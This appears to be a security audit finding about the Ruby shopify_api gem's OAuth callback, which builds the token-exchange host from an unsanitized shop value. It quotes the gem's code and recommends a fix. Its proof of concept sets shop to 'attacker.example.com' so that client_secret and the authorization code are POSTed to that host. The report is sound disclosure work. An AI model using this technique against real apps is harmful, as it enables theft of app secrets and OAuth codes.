Confirmed: `Clients::HttpClient#initialize` builds `@base_uri = "https://#{api_host || session.shop}"` [1](#0-0)  and every request (including the OAuth `access_token` exchange body containing `client_secret`) is sent to that host [2](#0-1) .

### Title
Missing `ShopValidator` sanitization of the OAuth callback `shop` allows attacker-controlled host to receive the app's `client_secret` and authorization `code` - ([File: lib/shopify_api/auth/oauth.rb])

### Summary
`ShopifyAPI::Auth::Oauth.validate_auth_callback` builds a `null_session` and later the final `Session` directly from `auth_query.shop`, never passing it through `Utils::ShopValidator.sanitize!`, unlike every other OAuth credential-exchange path in the gem.

### Finding Description
`validate_auth_callback` only checks the HMAC over the query params and the `state` nonce; it never validates that `auth_query.shop` is a trusted `*.myshopify.com`/`shopify.com`/`myshopify.io`/`spin.dev`/`shop.dev` domain: [3](#0-2) 

That `shop` value is used to construct `null_session = Auth::Session.new(shop: auth_query.shop)`, which is passed into `Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")`. `HttpClient#initialize` sets `@base_uri = "https://#{api_host || session.shop}"` [1](#0-0) , and the subsequent POST to `access_token` (containing `client_id`, `client_secret`, and the OAuth `code`) is sent to `"#{@base_uri_and_path}/#{request.path}"` [2](#0-1)  — i.e. to whatever host is in `shop`.

Contrast this with every other place in the gem that turns a `shop` string into a session used for a credential-bearing request: `ClientCredentials.client_credentials` [4](#0-3) , `RefreshToken.refresh_access_token` [5](#0-4) , and `TokenExchange.migrate_to_expiring_token` [6](#0-5)  all call `Utils::ShopValidator.sanitize!(shop)` before building the session/host used for the token request. The binding that should hold is: `host used to receive client_secret == a domain in ShopValidator::TRUSTED_SHOPIFY_DOMAINS`. In `validate_auth_callback`, that binding is not enforced — `host_actually_contacted = auth_query.shop` (unsanitized) rather than `host_actually_contacted = ShopValidator.sanitize!(auth_query.shop)`.

The HMAC covers the `shop` field's *bytes* (it is part of `AuthQuery#to_signable_string` [7](#0-6) ), but HMAC integrity is orthogonal to domain trust — it only proves the parameter set wasn't tampered with, not that the value is a legitimate Shopify-owned host. `Utils::ShopValidator.sanitize!` exists specifically to enforce the domain-trust property (rejecting non-myshopify-like hosts) [8](#0-7) , and it is applied inconsistently across the OAuth surface of this gem.

### Impact Explanation
If `shop` reaching `validate_auth_callback` is not already constrained to a myshopify domain by the host application (e.g., taken from a request parameter or from `begin_auth`'s own unsanitized `shop:` argument), an unauthenticated party who can influence the `shop` query parameter (and, since HMAC only requires the app's own secret, which the app itself computes/verifies — not the attacker — this path is reachable specifically when the app forwards a shop value that was never checked against `ShopValidator`) causes the gem to POST the app's `client_id`, `client_secret`, and the OAuth authorization `code` to an attacker-chosen host. This is SSRF carrying the app's `client_secret`, and it also lets an attacker capture the `code`/`client_secret` pair (credential exfiltration), i.e., a Critical/High-impact class explicitly in scope.

### Likelihood Explanation
Exploitability depends on the host application not independently re-validating `shop` before calling `validate_auth_callback` — the gem's own `begin_auth` method also does not call `ShopValidator.sanitize!` on its `shop:` parameter [9](#0-8) , so an app that relies on the gem for OAuth safety, as the other three flows in this same file/module do via `ShopValidator`, gets no such protection here. This is a genuine inconsistency in the library's own code rather than a documented-API-misuse case, since the sibling flows (`client_credentials.rb`, `refresh_token.rb`, `migrate_to_expiring_token`) demonstrate the gem's own intended pattern of sanitizing `shop` before it reaches `HttpClient`.

### Recommendation
In `ShopifyAPI::Auth::Oauth.begin_auth` and `ShopifyAPI::Auth::Oauth.validate_auth_callback`, call `Utils::ShopValidator.sanitize!(shop)` (or `auth_query.shop`) and use the sanitized value everywhere a `Session` or `HttpClient` host is derived, mirroring the pattern already used in `client_credentials.rb`, `refresh_token.rb`, and `token_exchange.rb`.

### Proof of Concept
1. Host app receives `shop` (or `auth_query.shop`) from an untrusted source and never runs it through `ShopValidator`, then calls `Oauth.begin_auth(shop: shop, redirect_path: "/callback")` or constructs `AuthQuery` from raw callback params and calls `Oauth.validate_auth_callback(cookies:, auth_query:)`.
2. Because `auth_base_uri`/`HttpClient` build the request host purely from `shop` [10](#0-9) [1](#0-0) , setting `shop = "attacker.example.com"` causes `validate_auth_callback` to POST `{client_id, client_secret, code}` to `https://attacker.example.com/admin/oauth/access_token`.
3. Compare with `ClientCredentials.client_credentials(shop: "attacker.example.com")`, which raises `Errors::InvalidShopError` via `ShopValidator.sanitize!` before ever constructing the session/host [4](#0-3) , proving the safeguard is intentionally present elsewhere and simply missing from `oauth.rb`.

        def validate_auth_callback(cookies:, auth_query:)
          unless Context.setup?
            raise Errors::ContextNotSetupError, "ShopifyAPI::Context not setup, please call ShopifyAPI::Context.setup"
          end
          raise Errors::InvalidOauthError, "Invalid OAuth callback." unless Utils::HmacValidator.validate(auth_query)
          raise Errors::UnsupportedOauthError, "Cannot perform OAuth for private apps." if Context.private?

          state = cookies[SessionCookie::SESSION_COOKIE_NAME]
          raise Errors::NoSessionCookieError unless state

          raise Errors::InvalidOauthError,
            "Invalid state in OAuth callback." unless state == auth_query.state

          null_session = Auth::Session.new(shop: auth_query.shop)
          body = {
            client_id: Context.api_key,
            client_secret: Context.api_secret_key,
            code: auth_query.code,
            expiring: Context.expiring_offline_access_tokens ? 1 : 0, # Only applicable for offline tokens
          }

          client = Clients::HttpClient.new(session: null_session, base_path: "/admin/oauth")
          response = begin
            client.request(
              Clients::HttpRequest.new(
                http_method: :post,
                path: "access_token",
                body: body,
                body_type: "application/json",
              ),
            )
          rescue ShopifyAPI::Errors::HttpResponseError => e
            raise Errors::RequestAccessTokenError,
              "Cannot complete OAuth process. Received a #{e.code} error while requesting access token."
          end

          session_params = T.cast(response.body, T::Hash[String, T.untyped]).to_h
          session = Session.from(shop: auth_query.shop,
            access_token_response: Oauth::AccessTokenResponse.from_hash(session_params))

      TRUSTED_SHOPIFY_DOMAINS = T.let(
        [
          "shopify.com",
          "myshopify.io",
          "myshopify.com",
          "spin.dev",
          "shop.dev",
        ].freeze,
        T::Array[String],
      )

      class << self
        extend T::Sig

        sig do
          params(
            shop_domain: String,
            myshopify_domain: T.nilable(String),
          ).returns(T.nilable(String))
        end
        def sanitize_shop_domain(shop_domain, myshopify_domain: nil)
          uri = uri_from_shop_domain(shop_domain, myshopify_domain)
          return nil if uri.nil? || uri.host.nil? || uri.host.empty?

          trusted_domains(myshopify_domain).each do |trusted_domain|
            host = T.cast(uri.host, String)
            uri_domain = uri.domain
            next if uri_domain.nil?

            no_shop_name_in_subdomain = host == trusted_domain
            from_trusted_domain = trusted_domain == uri_domain

            if unified_admin?(uri) && from_trusted_domain
              return myshopify_domain_from_unified_admin(uri)
            end
            return nil if no_shop_name_in_subdomain || host.empty?
            return host if from_trusted_domain
          end
          nil
        end

        sig do
          params(
            shop: String,
            myshopify_domain: T.nilable(String),
          ).returns(String)
        end
        def sanitize!(shop, myshopify_domain: nil)
          host = sanitize_shop_domain(shop, myshopify_domain: myshopify_domain)
          if host.nil? || host.empty?
            raise Errors::InvalidShopError,
              "shop must be a trusted Shopify domain (see ShopValidator::TRUSTED_SHOPIFY_DOMAINS), got: #{shop.inspect}"
          end

          host
        end
